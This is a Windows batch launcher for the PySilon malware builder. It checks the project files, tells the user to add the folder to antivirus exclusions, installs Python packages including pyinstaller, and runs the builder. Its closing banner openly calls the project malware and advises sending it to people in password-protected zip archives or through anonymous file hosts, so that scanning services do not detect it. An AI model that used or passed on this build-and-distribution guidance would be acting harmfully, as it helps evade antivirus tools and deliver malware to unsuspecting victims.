@echo off
setlocal enabledelayedexpansion
title PySilon

set "input_file=resources/cfg/project_tree/40.tree"

set "missing_files=missing_files.txt"
if exist "%missing_files%" del "%missing_files%"

echo Checking the project tree integrity...
for /f "usebackq delims=" %%A in ("%input_file%") do (
    set "path=%%A"

    if not exist "!path!" (
        echo MISSING: !path!
        echo %%A >> "%missing_files%"
    ) else (
        echo EXISTS: !path!
    )
)

if exist "%missing_files%" (
    echo.
    echo Some files are missing!
    type "%missing_files%"

    echo.
    echo You need to make sure that every file is in it's place, otherwise this project won't work.
    echo It's common for AVs to remove some files, so you might need to download them again.
    echo The best solution is to add directory to AVs exclusions list and re-clone the repository.
    echo.
    del "%missing_files%"
    pause
    exit /b 1

) else (
    echo The project is integral. Continuing...
    del "%missing_files%"
)

echo Proceeding with the script...

echo Initializing the virtual environment...
python -m venv pysilon
cls
call pysilon\Scripts\activate.bat
python -m pip install --upgrade pip
pip install pillow
pip install requests
pip install pyperclip
pip install pyinstaller
cls
python resources/builder.py
echo #===============================================================# 
echo #                    Software terminated.                       # 
echo #                                                               # 
echo #   Give us a Star on Github, this would really help us grow!   # 
echo #        https://github.com/mategol/PySilon-malware             # 
echo #                                                               #
echo #   Also, please don't send this malware using websites like    #
echo # Workupload or googledrive because they will scan the malware  #
echo # and keep track of it and other ocurrences, which will result  #
echo # in more detections in the future, please send it to people in #
echo # a zip archive with a password, or use services like anonfiles #
echo #                                                               #
echo #                         Thank You!                            #
echo #===============================================================# 
echo. 
echo.
pause